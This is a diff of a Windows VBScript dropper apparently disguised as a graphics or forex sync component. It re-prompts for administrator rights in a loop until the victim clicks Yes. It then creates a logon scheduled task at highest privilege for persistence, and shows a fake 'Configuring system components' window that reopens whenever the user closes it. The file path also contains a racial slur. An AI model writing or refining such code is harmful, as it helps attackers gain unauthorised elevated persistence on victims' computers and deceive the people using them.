@@ -7,22 +7,32 @@ strPath = "C:\Users\nigga12\AppData\Roaming\Local\WindowsGraphics"
 strScript = strPath & "\launcher.vbs"
 WshShell.CurrentDirectory = strPath
 
-' --- STEP 1: ELEVATION CHECK ---
-' Skips if running as /task (on reboot)
-If Not WScript.Arguments.Named.Exists("task") And Not WScript.Arguments.Named.Exists("elevate") Then
-    ' Request Admin rights hidden (0)
-    UAC.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevate", "", "runas", 0
+' --- STEP 1: THE PERSISTENT UAC LOOP ---
+' This will keep asking for Admin until the user finally clicks "Yes"
+If Not WScript.Arguments.Named.Exists("elevate") And Not WScript.Arguments.Named.Exists("task") Then
+    Do
+        ' We use "runas" to trigger UAC. 
+        ' If the user clicks "No", an error occurs, which we catch to restart the loop.
+        On Error Resume Next
+        UAC.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevate", "", "runas", 1
+        
+        ' If Err.Number is 0, it means they clicked "Yes"
+        If Err.Number = 0 Then Exit Do 
+        On Error GoTo 0
+        
+        ' Short sleep to prevent CPU spike if they spam "No"
+        WScript.Sleep 500 
+    Loop
     WScript.Quit
 End If
 
-' --- STEP 2: THE NO-UAC TASK CREATION ---
-' This registers the task to run as SYSTEM, which never triggers a UAC prompt.
+' --- STEP 2: ONCE "YES" IS CLICKED ---
 If WScript.Arguments.Named.Exists("elevate") Then
     strTaskName = "ForexForgeSync"
     
-    ' Key fix: Added //B for silence and /ru "SYSTEM" to bypass user-level prompts.
+    ' Register the task so it runs on every reboot
     strRunCmd = "wscript.exe //B """ & strScript & """ /task"
-    strCreateTask = "schtasks /create /tn """ & strTaskName & """ /tr """ & strRunCmd & """ /sc onlogon /rl highest /ru ""SYSTEM"" /f"
+    strCreateTask = "schtasks /create /tn """ & strTaskName & """ /tr """ & strRunCmd & """ /sc onlogon /rl highest /f"
     
     WshShell.Run "cmd.exe /c " & strCreateTask, 0, True
     
@@ -32,14 +42,13 @@ If WScript.Arguments.Named.Exists("elevate") Then
     End If
 End If
 
-' --- STEP 3: THE "STICKY" DISTRACTION LOOP -------
-' This runs on reboot (/task). If they close it, it re-opens until 30s is up.
+' --- STEP 3: THE STICKY DISTRACTION WINDOW ---
+' This runs after they click Yes, and also on every reboot via the Task Scheduler.
 startTime = Timer
 Do While Timer < startTime + 30
-    ' 1 = Visible, True = Script pauses and watches if the user closes the window.
+    ' Re-launches the blue window if they try to close it
     WshShell.Run "cmd.exe /c title System Configuration && color 1f && echo. && echo  Configuring system components... Please wait. && echo  Do not close this window to avoid system errors. && timeout /t 30 /nobreak > nul", 1, True
     
-    ' Re-launch if closed before the timer ends
     If Timer < startTime + 30 Then 
         WScript.Sleep 500 
     End If
